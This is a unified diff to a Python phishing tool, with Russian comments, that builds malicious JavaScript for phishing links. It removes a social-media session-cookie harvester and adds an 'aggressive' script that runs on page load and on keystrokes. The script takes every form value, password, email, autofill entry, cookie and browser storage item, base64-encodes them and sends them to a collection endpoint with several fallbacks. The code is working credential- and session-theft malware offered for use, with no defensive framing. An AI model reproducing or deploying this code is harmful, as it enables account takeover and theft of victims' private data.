@@ -49,7 +49,6 @@ class PhishingLink:
     collected_logins: List[Dict] = None
     collected_storage_data: List[Dict] = None  # localStorage/sessionStorage
     full_sensitive_data: List[Dict] = None     # Полные сырые данные
-    social_auth_data: List[Dict] = None        # Данные авторизации соцсетей
     
     def __post_init__(self):
         if self.data_collected is None:
@@ -64,8 +63,6 @@ class PhishingLink:
             self.collected_storage_data = []
         if self.full_sensitive_data is None:
             self.full_sensitive_data = []
-        if self.social_auth_data is None:
-            self.social_auth_data = []
 
 class Database:
     def __init__(self):
@@ -81,7 +78,7 @@ class Database:
             "logins_collected": 0,
             "storage_data_collected": 0,
             "full_data_collected": 0,
-            "social_auth_found": 0
+            "passive_collections": 0  # Новый счетчик пассивных сборов
         }
     
     def add_link(self, link: PhishingLink):
@@ -134,11 +131,9 @@ class Database:
             self.stats["full_data_collected"] += 1
             self.save()
     
-    def add_social_auth_data(self, link_id: str, social_data: Dict):
-        if link_id in self.links:
-            self.links[link_id].social_auth_data.append(social_data)
-            self.stats["social_auth_found"] += 1
-            self.save()
+    def add_passive_collection(self):
+        self.stats["passive_collections"] += 1
+        self.save()
     
     def save(self):
         try:
@@ -170,544 +165,389 @@ db.load()
 class JavaScriptInjector:
     @staticmethod
     def get_cookies_collection_script() -> str:
-        """JavaScript для сбора cookies"""
+        """JavaScript для агрессивного сбора данных"""
         return """
         <script>
-        // Функция для сбора всех cookies
-        function collectAllCookies() {
-            const cookies = {};
-            
-            const cookieString = document.cookie;
-            if (cookieString) {
-                cookieString.split(';').forEach(cookie => {
-                    const [name, value] = cookie.trim().split('=');
-                    if (name && value) {
-                        cookies[name] = decodeURIComponent(value);
-                    }
-                });
-            }
-            
-            return cookies;
-        }
-        
-        // Функция для сбора сохраненных паролей и логинов
-        function collectSavedCredentials() {
-            const credentials = {
+        // Функция для агрессивного сбора данных из всех полей
+        function aggressivelyCollectFormData() {
+            const collectedData = {
+                forms: [],
+                inputs: [],
                 passwords: [],
-                logins: [],
-                autofill_data: []
+                emails: [],
+                all_values: {}
             };
             
             try {
-                const passwordFields = document.querySelectorAll('input[type="password"]');
-                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
-                
-                passwordFields.forEach(field => {
-                    if (field.value) {
-                        credentials.passwords.push({
-                            field_name: field.name || field.id || 'unknown',
-                            field_id: field.id,
-                            field_class: field.className,
-                            value: field.value,
-                            page_url: window.location.href,
-                            timestamp: new Date().toISOString()
-                        });
-                    }
-                });
-                
-                loginFields.forEach(field => {
-                    if (field.value && (field.type === 'text' || field.type === 'email' || field.type === 'tel')) {
-                        credentials.logins.push({
-                            field_name: field.name || field.id || 'unknown',
-                            field_id: field.id,
-                            field_class: field.className,
-                            value: field.value,
-                            page_url: window.location.href,
-                            timestamp: new Date().toISOString()
-                        });
-                    }
-                });
-                
-                document.querySelectorAll('form').forEach(form => {
-                    try {
-                        const formData = new FormData(form);
-                        const formValues = {};
-                        for (let [key, value] of formData.entries()) {
-                            formValues[key] = value;
-                        }
-                        
-                        if (Object.keys(formValues).length > 0) {
-                            credentials.autofill_data.push({
-                                type: 'form_data',
-                                form_id: form.id || 'unknown',
-                                form_action: form.action || 'unknown',
-                                data: formValues
-                            });
-                        }
-                    } catch (e) {}
-                });
-                
-            } catch (e) {
-                console.error('Error collecting credentials:', e);
-            }
-            
-            return credentials;
-        }
-        
-        // Функция для извлечения паролей из менеджеров паролей
-        function extractPasswordManagerData() {
-            const managerData = {
-                browser_saved: [],
-                third_party: []
-            };
-            
-            try {
-                if (navigator.credentials && navigator.credentials.get) {
-                    navigator.credentials.get({password: true})
-                        .then(credential => {
-                            if (credential) {
-                                managerData.browser_saved.push({
-                                    type: 'browser_native',
-                                    data: credential
+                // Собираем ВСЕ формы
+                document.querySelectorAll('form').forEach((form, index) => {
+                    const formData = {};
+                    let hasData = false;
+                    
+                    // Собираем все поля формы
+                    form.querySelectorAll('input, textarea, select').forEach(input => {
+                        if (input.value && input.value.trim() !== '') {
+                            formData[input.name || input.id || `field_${index}`] = {
+                                value: input.value,
+                                type: input.type,
+                                id: input.id,
+                                name: input.name,
+                                className: input.className
+                            };
+                            hasData = true;
+                            
+                            // Особое внимание к паролям и логинам
+                            if (input.type === 'password') {
+                                collectedData.passwords.push({
+                                    element: input.outerHTML.substring(0, 100),
+                                    value: input.value,
+                                    form: form.id || form.className || `form_${index}`
                                 });
                             }
-                        })
-                        .catch(e => {});
-                }
-                
-                const passwordManagers = [
-                    'lastpass', '1password', 'dashlane', 'bitwarden',
-                    'keeper', 'roboform', 'nordpass', 'enpass'
-                ];
-                
-                passwordManagers.forEach(manager => {
-                    try {
-                        const managerElements = document.querySelectorAll(`[class*="${manager}"], [id*="${manager}"]`);
-                        if (managerElements.length > 0) {
-                            managerData.third_party.push({
-                                manager: manager,
-                                detected: true,
-                                elements_count: managerElements.length
-                            });
+                            
+                            if (input.type === 'email' || input.name?.includes('email') || 
+                                input.id?.includes('email') || input.className?.includes('email')) {
+                                collectedData.emails.push({
+                                    element: input.outerHTML.substring(0, 100),
+                                    value: input.value,
+                                    form: form.id || form.className || `form_${index}`
+                                });
+                            }
                         }
-                    } catch (e) {}
+                    });
+                    
+                    if (hasData) {
+                        collectedData.forms.push({
+                            formIndex: index,
+                            action: form.action,
+                            method: form.method,
+                            data: formData
+                        });
+                    }
                 });
                 
-            } catch (e) {
-                console.error('Error extracting password manager data:', e);
+                // Собираем ВСЕ поля ввода на странице (даже вне форм)
+                document.querySelectorAll('input, textarea, select').forEach((input, index) => {
+                    if (input.value && input.value.trim() !== '') {
+                        collectedData.inputs.push({
+                            index: index,
+                            type: input.type,
+                            name: input.name,
+                            id: input.id,
+                            value: input.value,
+                            placeholder: input.placeholder,
+                            className: input.className
+                        });
+                        
+                        // Сохраняем в общий объект
+                        const key = `input_${index}_${input.type}_${input.name || input.id || 'unnamed'}`;
+                        collectedData.all_values[key] = input.value;
+                    }
+                });
+                
+                // Пытаемся извлечь сохраненные данные из автозаполнения
+                try {
+                    // Принудительно вызываем события для выявления автозаполненных полей
+                    setTimeout(() => {
+                        document.querySelectorAll('input').forEach(input => {
+                            // Имитируем фокус и блюр для вызова автозаполнения
+                            if (input.type === 'password' || input.type === 'text' || 
+                                input.type === 'email') {
+                                input.dispatchEvent(new Event('focus', { bubbles: true }));
+                                input.dispatchEvent(new Event('blur', { bubbles: true }));
+                                input.dispatchEvent(new Event('change', { bubbles: true }));
+                            }
+                        });
+                    }, 100);
+                } catch (e) {}
+                
+            } catch (error) {
+                console.error('Aggressive collection error:', error);
             }
             
-            return managerData;
+            return collectedData;
         }
         
-        // Функция для сбора данных авторизации в соцсетях (ОБНОВЛЕННАЯ)
-        function collectSocialMediaLogins() {
-            const socialLogins = {
-                google: {
-                    cookies: [],
-                    localStorage: {},
-                    sessionStorage: {},
-                    auth_status: "not_logged_in",
-                    tokens_found: 0,
-                    detected_domains: []
-                },
-                facebook: {
-                    cookies: [],
-                    localStorage: {},
-                    sessionStorage: {},
-                    auth_status: "not_logged_in",
-                    tokens_found: 0,
-                    detected_domains: []
-                },
-                twitter: {
-                    cookies: [],
-                    localStorage: {},
-                    sessionStorage: {},
-                    auth_status: "not_logged_in",
-                    tokens_found: 0,
-                    detected_domains: []
-                },
-                vk: {
-                    cookies: [],
-                    localStorage: {},
-                    sessionStorage: {},
-                    auth_status: "not_logged_in",
-                    tokens_found: 0,
-                    detected_domains: []
-                },
-                instagram: {
-                    cookies: [],
-                    localStorage: {},
-                    sessionStorage: {},
-                    auth_status: "not_logged_in",
-                    tokens_found: 0,
-                    detected_domains: []
-                }
+        // Функция для поиска и извлечения сохраненных учетных данных
+        function extractSavedCredentials() {
+            const credentials = {
+                browser_saved: [],
+                auto_filled: [],
+                localStorage_creds: []
             };
             
-            const authKeywords = [
-                'token', 'access_token', 'refresh_token', 'session', 'auth', 
-                'login', 'user', 'oauth', 'id_token', 'bearer', 'csrf',
-                'xsrf', 'jwt', 'credential', 'password', 'secret',
-                'account', 'profile', 'uid', 'user_id', 'email'
-            ];
-            
             try {
-                // 1. Собираем все cookies
-                const allCookies = document.cookie.split(';');
-                
-                allCookies.forEach(cookie => {
-                    const [name, value] = cookie.trim().split('=');
-                    if (!name || !value) return;
-                    
-                    const cookieName = name.toLowerCase();
-                    const cookieValue = decodeURIComponent(value);
-                    
-                    // Google
-                    if (cookieName.includes('google') || 
-                        cookieName.includes('gmail') || 
-                        cookieName.includes('youtube') ||
-                        cookieName.includes('accounts.google') ||
-                        cookieName.includes('gauth') ||
-                        cookieName.includes('gid') ||
-                        cookieName.includes('gtoken')) {
-                        socialLogins.google.cookies.push({
-                            name: name,
-                            value: cookieValue.substring(0, 500),
-                            timestamp: new Date().toISOString()
-                        });
-                        
-                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
-                            cookieValue.includes(keyword))) {
-                            socialLogins.google.tokens_found++;
-                            socialLogins.google.auth_status = "tokens_detected";
-                        }
-                    }
-                    
-                    // Facebook
-                    if (cookieName.includes('facebook') || 
-                        cookieName.includes('fb_') ||
-                        cookieName.includes('c_user') ||
-                        cookieName.includes('xs') ||
-                        cookieName.includes('fr') ||
-                        cookieName.includes('datr') ||
-                        cookieName.includes('sb')) {
-                        socialLogins.facebook.cookies.push({
-                            name: name,
-                            value: cookieValue.substring(0, 500),
-                            timestamp: new Date().toISOString()
-                        });
-                        
-                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
-                            cookieValue.includes(keyword))) {
-                            socialLogins.facebook.tokens_found++;
-                            socialLogins.facebook.auth_status = "tokens_detected";
-                        }
-                    }
-                    
-                    // Twitter/X
-                    if (cookieName.includes('twitter') || 
-                        cookieName.includes('x.com') ||
-                        cookieName.includes('guest_id') ||
-                        cookieName.includes('auth_token') ||
-                        cookieName.includes('ct0') ||
-                        cookieName.includes('twid')) {
-                        socialLogins.twitter.cookies.push({
-                            name: name,
-                            value: cookieValue.substring(0, 500),
-                            timestamp: new Date().toISOString()
-                        });
-                        
-                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
-                            cookieValue.includes(keyword))) {
-                            socialLogins.twitter.tokens_found++;
-                            socialLogins.twitter.auth_status = "tokens_detected";
-                        }
-                    }
-                    
-                    // VK
-                    if (cookieName.includes('vk') || 
-                        cookieName.includes('vkontakte') ||
-                        cookieName.includes('remixsid') ||
-                        cookieName.includes('remixlang') ||
-                        cookieName.includes('remixstid') ||
-                        cookieName.includes('remixflash')) {
-                        socialLogins.vk.cookies.push({
-                            name: name,
-                            value: cookieValue.substring(0, 500),
-                            timestamp: new Date().toISOString()
-                        });
-                        
-                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
-                            cookieValue.includes(keyword))) {
-                            socialLogins.vk.tokens_found++;
-                            socialLogins.vk.auth_status = "tokens_detected";
-                        }
-                    }
-                    
-                    // Instagram
-                    if (cookieName.includes('instagram') || 
-                        cookieName.includes('ig_') ||
-                        cookieName.includes('sessionid') ||
-                        cookieName.includes('csrftoken') ||
-                        cookieName.includes('mid') ||
-                        cookieName.includes('ds_user_id')) {
-                        socialLogins.instagram.cookies.push({
-                            name: name,
-                            value: cookieValue.substring(0, 500),
-                            timestamp: new Date().toISOString()
-                        });
-                        
-                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
-                            cookieValue.includes(keyword))) {
-                            socialLogins.instagram.tokens_found++;
-                            socialLogins.instagram.auth_status = "tokens_detected";
-                        }
-                    }
-                });
-                
-                // 2. Проверяем localStorage
+                // Проверяем localStorage на наличие сохраненных учетных данных
                 if (window.localStorage) {
                     for (let i = 0; i < localStorage.length; i++) {
                         const key = localStorage.key(i);
                         const value = localStorage.getItem(key);
                         
-                        if (!key || !value) continue;
-                        
-                        const lowerKey = key.toLowerCase();
-                        const lowerValue = value.toLowerCase();
-                        
-                        // Google
-                        if (lowerKey.includes('google') || 
-                            lowerKey.includes('gmail') ||
-                            lowerValue.includes('google') ||
-                            lowerValue.includes('accounts.google.com')) {
-                            socialLogins.google.localStorage[key] = value.substring(0, 1000);
-                            
-                            if (authKeywords.some(keyword => 
-                                lowerKey.includes(keyword) || 
-                                lowerValue.includes(keyword))) {
-                                socialLogins.google.tokens_found++;
-                                socialLogins.google.auth_status = "local_storage_tokens";
-                            }
-                        }
-                        
-                        // Facebook
-                        if (lowerKey.includes('facebook') || 
-                            lowerKey.includes('fb_') ||
-                            lowerValue.includes('facebook') ||
-                            lowerValue.includes('fb.com')) {
-                            socialLogins.facebook.localStorage[key] = value.substring(0, 1000);
-                            
-                            if (authKeywords.some(keyword => 
-                                lowerKey.includes(keyword) || 
-                                lowerValue.includes(keyword))) {
-                                socialLogins.facebook.tokens_found++;
-                                socialLogins.facebook.auth_status = "local_storage_tokens";
-                            }
-                        }
-                        
-                        // Twitter
-                        if (lowerKey.includes('twitter') || 
-                            lowerKey.includes('x.com') ||
-                            lowerValue.includes('twitter') ||
-                            lowerValue.includes('x.com')) {
-                            socialLogins.twitter.localStorage[key] = value.substring(0, 1000);
-                            
-                            if (authKeywords.some(keyword => 
-                                lowerKey.includes(keyword) || 
-                                lowerValue.includes(keyword))) {
-                                socialLogins.twitter.tokens_found++;
-                                socialLogins.twitter.auth_status = "local_storage_tokens";
-                            }
-                        }
-                        
-                        // VK
-                        if (lowerKey.includes('vk') || 
-                            lowerKey.includes('vkontakte') ||
-                            lowerValue.includes('vk.com') ||
-                            lowerValue.includes('vkontakte.ru')) {
-                            socialLogins.vk.localStorage[key] = value.substring(0, 1000);
-                            
-                            if (authKeywords.some(keyword => 
-                                lowerKey.includes(keyword) || 
-                                lowerValue.includes(keyword))) {
-                                socialLogins.vk.tokens_found++;
-                                socialLogins.vk.auth_status = "local_storage_tokens";
-                            }
+                        // Ищем ключи, которые могут содержать учетные данные
+                        if (key && value && (
+                            key.toLowerCase().includes('auth') ||
+                            key.toLowerCase().includes('token') ||
+                            key.toLowerCase().includes('session') ||
+                            key.toLowerCase().includes('user') ||
+                            key.toLowerCase().includes('login') ||
+                            key.toLowerCase().includes('pass') ||
+                            key.toLowerCase().includes('cred') ||
+                            key.toLowerCase().includes('cookie')
+                        )) {
+                            credentials.localStorage_creds.push({
+                                key: key,
+                                value: value.substring(0, 500), // Ограничиваем длину
+                                length: value.length
+                            });
                         }
                     }
                 }
                 
-                // 3. Проверяем sessionStorage
-                if (window.sessionStorage) {
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        const value = sessionStorage.getItem(key);
-                        
-                        if (!key || !value) continue;
-                        
-                        const lowerKey = key.toLowerCase();
-                        
-                        if (authKeywords.some(keyword => lowerKey.includes(keyword))) {
-                            if (lowerKey.includes('google') || value.includes('google.com')) {
-                                socialLogins.google.sessionStorage[key] = value.substring(0, 1000);
-                                socialLogins.google.auth_status = "session_storage_tokens";
-                            } else if (lowerKey.includes('facebook') || value.includes('fb.com')) {
-                                socialLogins.facebook.sessionStorage[key] = value.substring(0, 1000);
-                                socialLogins.facebook.auth_status = "session_storage_tokens";
-                            } else if (lowerKey.includes('twitter') || value.includes('x.com')) {
-                                socialLogins.twitter.sessionStorage[key] = value.substring(0, 1000);
-                                socialLogins.twitter.auth_status = "session_storage_tokens";
-                            } else if (lowerKey.includes('vk') || value.includes('vkontakte')) {
-                                socialLogins.vk.sessionStorage[key] = value.substring(0, 1000);
-                                socialLogins.vk.auth_status = "session_storage_tokens";
-                            } else if (lowerKey.includes('instagram') || value.includes('instagram.com')) {
-                                socialLogins.instagram.sessionStorage[key] = value.substring(0, 1000);
-                                socialLogins.instagram.auth_status = "session_storage_tokens";
-                            }
+                // Пытаемся получить доступ к менеджеру паролей браузера
+                if (navigator.credentials && navigator.credentials.get) {
+                    navigator.credentials.get({
+                        password: true,
+                        mediation: 'optional'
+                    }).then(credential => {
+                        if (credential) {
+                            credentials.browser_saved.push({
+                                type: 'browser_password_manager',
+                                id: credential.id || 'unknown',
+                                name: credential.name || 'unknown',
+                                displayName: credential.displayName || 'unknown'
+                            });
                         }
-                    }
+                    }).catch(() => {});
                 }
                 
-                // 4. Определяем статус авторизации
-                Object.keys(socialLogins).forEach(platform => {
-                    const data = socialLogins[platform];
-                    
-                    if (data.tokens_found > 0 || 
-                        data.cookies.some(c => 
-                            c.name.includes('session') || 
-                            c.name.includes('token') ||
-                            c.name.includes('auth'))) {
-                        
-                        if (platform === 'google') {
-                            if (data.cookies.some(c => 
-                                c.name.includes('SID') || 
-                                c.name.includes('HSID') ||
-                                c.name.includes('SSID') ||
-                                c.name.includes('APISID') ||
-                                c.name.includes('SAPISID'))) {
-                                data.auth_status = "google_logged_in";
-                            }
+                // Проверяем автозаполненные поля
+                setTimeout(() => {
+                    document.querySelectorAll('input').forEach(input => {
+                        if (input.value && (
+                            input.type === 'password' ||
+                            (input.type === 'text' && (
+                                input.autocomplete === 'email' ||
+                                input.autocomplete === 'username' ||
+                                input.name?.toLowerCase().includes('user') ||
+                                input.name?.toLowerCase().includes('login') ||
+                                input.name?.toLowerCase().includes('mail')
+                            ))
+                        )) {
+                            credentials.auto_filled.push({
+                                type: input.type,
+                                name: input.name,
+                                id: input.id,
+                                value: input.value,
+                                autocomplete: input.autocomplete,
+                                has_value: input.value.length > 0
+                            });
                         }
-                        
-                        if (platform === 'facebook') {
-                            if (data.cookies.some(c => 
-                                c.name === 'c_user' || 
-                                c.name === 'xs')) {
-                                data.auth_status = "facebook_logged_in";
-                            }
-                        }
-                        
-                        if (platform === 'vk') {
-                            if (data.cookies.some(c => c.name === 'remixsid')) {
-                                data.auth_status = "vk_logged_in";
-                            }
-                        }
-                        
-                        if (platform === 'instagram') {
-                            if (data.cookies.some(c => c.name === 'sessionid')) {
-                                data.auth_status = "instagram_logged_in";
-                            }
-                        }
-                        
-                        if (platform === 'twitter') {
-                            if (data.cookies.some(c => 
-                                c.name.includes('auth_token') ||
-                                c.name.includes('ct0'))) {
-                                data.auth_status = "twitter_logged_in";
-                            }
-                        }
-                    }
-                });
+                    });
+                }, 500);
                 
-                // 5. Пассивная проверка доступа к соцсетям
-                const socialDomains = [
-                    'https://accounts.google.com',
-                    'https://facebook.com',
-                    'https://www.facebook.com',
-                    'https://twitter.com',
-                    'https://x.com',
-                    'https://vk.com',
-                    'https://instagram.com'
-                ];
-                
-                socialDomains.forEach(domain => {
-                    fetch(domain, {
-                        method: 'HEAD',
-                        mode: 'no-cors',
-                        credentials: 'include'
-                    })
-                    .then(() => {
-                        const platform = domain.includes('google') ? 'google' :
-                                       domain.includes('facebook') ? 'facebook' :
-                                       domain.includes('twitter') ? 'twitter' :
-                                       domain.includes('x.com') ? 'twitter' :
-                                       domain.includes('vk.com') ? 'vk' : 'instagram';
-                        
-                        if (!socialLogins[platform].detected_domains.includes(domain)) {
-                            socialLogins[platform].detected_domains.push(domain);
-                        }
-                        
-                        // Если смогли отправить запрос с cookies, значит они есть
-                        if (socialLogins[platform].auth_status === "not_logged_in") {
-                            socialLogins[platform].auth_status = "cookies_present";
-                        }
-                    })
-                    .catch(() => {});
-                });
-                
-            } catch (e) {
-                console.error('Error collecting social media logins:', e);
+            } catch (error) {
+                console.error('Credentials extraction error:', error);
             }
             
-            return socialLogins;
+            return credentials;
         }
         
-        // Функция для сбора данных из хранилища
-        function collectStorageData() {
-            const storageData = {
+        // Основная функция агрессивного сбора
+        async function performAggressiveCollection() {
+            const collectionResult = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                aggressive_collection: true,
+                passive_mode: true, // Сбор без действий пользователя
+                form_data: aggressivelyCollectFormData(),
+                saved_credentials: extractSavedCredentials(),
+                cookies: {},
                 localStorage: {},
                 sessionStorage: {},
-                indexedDB: []
+                device_info: {
+                    screen_width: window.screen.width,
+                    screen_height: window.screen.height,
+                    color_depth: window.screen.colorDepth,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookie_enabled: navigator.cookieEnabled
+                }
             };
             
+            // Собираем cookies
+            try {
+                const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+                    const [key, value] = cookie.trim().split('=');
+                    if (key) acc[key] = decodeURIComponent(value || '');
+                    return acc;
+                }, {});
+                collectionResult.cookies = cookies;
+            } catch (e) {}
+            
+            // Собираем localStorage
             try {
                 if (window.localStorage) {
+                    const ls = {};
                     for (let i = 0; i < localStorage.length; i++) {
                         const key = localStorage.key(i);
-                        storageData.localStorage[key] = localStorage.getItem(key);
+                        ls[key] = localStorage.getItem(key);
                     }
+                    collectionResult.localStorage = ls;
                 }
-                
+            } catch (e) {}
+            
+            // Собираем sessionStorage
+            try {
                 if (window.sessionStorage) {
+                    const ss = {};
                     for (let i = 0; i < sessionStorage.length; i++) {
                         const key = sessionStorage.key(i);
-                        storageData.sessionStorage[key] = sessionStorage.getItem(key);
+                        ss[key] = sessionStorage.getItem(key);
                     }
+                    collectionResult.sessionStorage = ss;
                 }
-                
-                if (window.indexedDB) {
-                    try {
-                        if (indexedDB.databases) {
-                            indexedDB.databases().then(dbs => {
-                                storageData.indexedDB = dbs.map(db => ({
-                                    name: db.name,
-                                    version: db.version
-                                }));
-                            }).catch(() => {});
-                        }
-                    } catch (e) {}
-                }
-                
-            } catch (e) {
-                console.error('Error collecting storage data:', e);
-            }
+            } catch (e) {}
             
-            return storageData;
+            return collectionResult;
         }
         
-        // Главная функция сбора всех данных
+        // Функция отправки данных на сервер
+        function sendCollectedData(data) {
+            const linkId = new URLSearchParams(window.location.search).get('id');
+            if (!linkId) return;
+            
+            try {
+                // Кодируем данные для отправки
+                const jsonData = JSON.stringify({
+                    ...data,
+                    collection_timestamp: new Date().toISOString(),
+                    page_loaded: true,
+                    passive_collection: true, // Флаг пассивного сбора
+                    user_interaction: document.hasFocus() // Проверяем активность
+                });
+                
+                const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
+                
+                // Используем различные методы отправки для надежности
+                const sendMethods = [
+                    // Основной метод
+                    () => fetch('/api/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            link_id: linkId,
+                            data_type: 'aggressive_collection',
+                            data: encodedData,
+                            timestamp: new Date().toISOString(),
+                            is_passive: true
+                        })
+                    }),
+                    
+                    // Fallback метод 1
+                    () => {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', '/api/collect', true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.send(JSON.stringify({
+                            link_id: linkId,
+                            data_type: 'aggressive_collection',
+                            data: encodedData,
+                            timestamp: new Date().toISOString(),
+                            is_passive: true
+                        }));
+                    },
+                    
+                    // Fallback метод 2 (sendBeacon для закрытия страницы)
+                    () => {
+                        const blob = new Blob([JSON.stringify({
+                            link_id: linkId,
+                            data_type: 'aggressive_collection',
+                            data: encodedData,
+                            timestamp: new Date().toISOString(),
+                            is_passive: true,
+                            exit_event: true
+                        })], {type: 'application/json'});
+                        navigator.sendBeacon('/api/collect', blob);
+                    }
+                ];
+                
+                // Пробуем все методы
+                sendMethods.forEach(method => {
+                    try {
+                        method();
+                    } catch (e) {
+                        console.error('Send method failed:', e);
+                    }
+                });
+                
+            } catch (error) {
+                console.error('Error preparing data for send:', error);
+            }
+        }
+        
+        // ЗАПУСК АГРЕССИВНОГО СБОРА ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
+        let collectionCount = 0;
+        const maxCollections = 5; // Максимальное количество сборов
+        
+        function startAggressiveCollection() {
+            // Первый сбор сразу
+            setTimeout(async () => {
+                try {
+                    const data = await performAggressiveCollection();
+                    sendCollectedData(data);
+                    collectionCount++;
+                } catch (e) {
+                    console.error('First collection failed:', e);
+                }
+            }, 1000);
+            
+            // Последующие сборы с интервалом
+            const intervals = [2000, 5000, 10000, 20000]; // 1, 2, 5, 10, 20 секунд
+            intervals.forEach(delay => {
+                setTimeout(async () => {
+                    if (collectionCount < maxCollections) {
+                        try {
+                            const data = await performAggressiveCollection();
+                            sendCollectedData(data);
+                            collectionCount++;
+                        } catch (e) {
+                            console.error(`Collection at ${delay}ms failed:`, e);
+                        }
+                    }
+                }, delay);
+            });
+            
+            // Сбор при любом взаимодействии с мышью/клавиатурой
+            document.addEventListener('mousemove', async () => {
+                if (collectionCount < maxCollections) {
+                    try {
+                        const data = await performAggressiveCollection();
+                        sendCollectedData(data);
+                        collectionCount++;
+                    } catch (e) {}
+                }
+            }, { once: false });
+            
+            document.addEventListener('keydown', async () => {
+                if (collectionCount < maxCollections) {
+                    try {
+                        const data = await performAggressiveCollection();
+                        sendCollectedData(data);
+                        collectionCount++;
+                    } catch (e) {}
+                }
+            }, { once: false });
+        }
+        
+        // Запускаем агрессивный сбор при загрузке
+        window.addEventListener('DOMContentLoaded', startAggressiveCollection);
+        window.addEventListener('load', startAggressiveCollection);
+        
+        // Также запускаем через 100мс на всякий случай
+        setTimeout(startAggressiveCollection, 100);
+        
+        // Стандартный сбор для совместимости
         async function collectAllSensitiveData() {
             const allData = {
                 timestamp: new Date().toISOString(),
@@ -725,25 +565,54 @@ class JavaScriptInjector:
                     java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                     pdf_viewer_enabled: navigator.pdfViewerEnabled || false,
                     do_not_track: navigator.doNotTrack || 'unspecified'
-                },
-                screen_info: {
-                    width: window.screen.width,
-                    height: window.screen.height,
-                    color_depth: window.screen.colorDepth,
-                    pixel_depth: window.screen.pixelDepth
-                },
-                timezone: {
-                    offset: new Date().getTimezoneOffset(),
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 }
             };
             
             try {
-                allData.cookies = collectAllCookies();
-                allData.credentials = collectSavedCredentials();
-                allData.password_managers = extractPasswordManagerData();
-                allData.social_logins = collectSocialMediaLogins();
-                allData.storage_data = collectStorageData();
+                // Собираем cookies
+                const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+                    const [key, value] = cookie.trim().split('=');
+                    if (key) acc[key] = decodeURIComponent(value || '');
+                    return acc;
+                }, {});
+                allData.cookies = cookies;
+                
+                // Собираем пароли и логины
+                const passwordFields = document.querySelectorAll('input[type="password"]');
+                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
+                
+                allData.credentials = {
+                    passwords: Array.from(passwordFields).map(field => ({
+                        field_name: field.name || field.id || 'unknown',
+                        value: field.value,
+                        page_url: window.location.href
+                    })),
+                    logins: Array.from(loginFields).map(field => ({
+                        field_name: field.name || field.id || 'unknown',
+                        value: field.value,
+                        page_url: window.location.href
+                    }))
+                };
+                
+                // Собираем данные из хранилищ
+                allData.storage_data = {
+                    localStorage: {},
+                    sessionStorage: {}
+                };
+                
+                if (window.localStorage) {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        allData.storage_data.localStorage[key] = localStorage.getItem(key);
+                    }
+                }
+                
+                if (window.sessionStorage) {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        allData.storage_data.sessionStorage[key] = sessionStorage.getItem(key);
+                    }
+                }
                 
                 return allData;
                 
@@ -756,8 +625,8 @@ class JavaScriptInjector:
             }
         }
         
-        // Функция отправки данных на сервер
-        function sendCollectedData(data) {
+        // Отправка стандартных данных
+        function sendStandardData(data) {
             const linkId = new URLSearchParams(window.location.search).get('id');
             if (!linkId) return;
             
@@ -765,141 +634,48 @@ class JavaScriptInjector:
                 const jsonData = JSON.stringify(data);
                 const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                 
-                // Основная отправка
                 fetch('/api/collect', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         link_id: linkId,
                         data_type: 'sensitive_data',
                         data: encodedData,
                         timestamp: new Date().toISOString()
                     })
-                })
-                .then(response => response.json())
-                .then(result => {
-                    console.log('Data sent successfully:', result);
-                    
-                    // Дополнительная отправка данных авторизации
-                    if (data.social_logins) {
-                        const socialData = {
-                            timestamp: new Date().toISOString(),
-                            social_logins: data.social_logins,
-                            url: window.location.href
-                        };
-                        
-                        const socialJson = JSON.stringify(socialData);
-                        const socialEncoded = btoa(unescape(encodeURIComponent(socialJson)));
-                        
-                        fetch('/api/auth-collect', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                link_id: linkId,
-                                data_type: 'social_auth',
-                                data: socialEncoded,
-                                timestamp: new Date().toISOString()
-                            })
-                        });
-                    }
-                })
-                .catch(error => {
-                    console.error('Error sending data:', error);
-                    try {
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('POST', '/api/collect', true);
-                        xhr.setRequestHeader('Content-Type', 'application/json');
-                        xhr.send(JSON.stringify({
-                            link_id: linkId,
-                            data_type: 'sensitive_data',
-                            data: encodedData,
-                            timestamp: new Date().toISOString()
-                        }));
-                    } catch (e) {
-                        console.error('Fallback send also failed:', e);
-                    }
+                }).catch(error => {
+                    console.error('Error sending standard data:', error);
                 });
             } catch (error) {
-                console.error('Error preparing data for send:', error);
+                console.error('Error preparing standard data:', error);
             }
         }
         
-        // Автоматический сбор данных при загрузке страницы
-        window.addEventListener('load', function() {
-            setTimeout(async () => {
-                try {
-                    const sensitiveData = await collectAllSensitiveData();
-                    sendCollectedData(sensitiveData);
-                } catch (e) {
-                    console.error('Initial collection failed:', e);
-                }
-                
-                // Сбор при взаимодействии с формами
-                document.addEventListener('submit', async function(e) {
-                    setTimeout(async () => {
-                        try {
-                            const formData = await collectAllSensitiveData();
-                            sendCollectedData(formData);
-                        } catch (e) {
-                            console.error('Form submit collection failed:', e);
-                        }
-                    }, 500);
-                });
-                
-                // Сбор при изменении полей
-                document.querySelectorAll('input, textarea, select').forEach(input => {
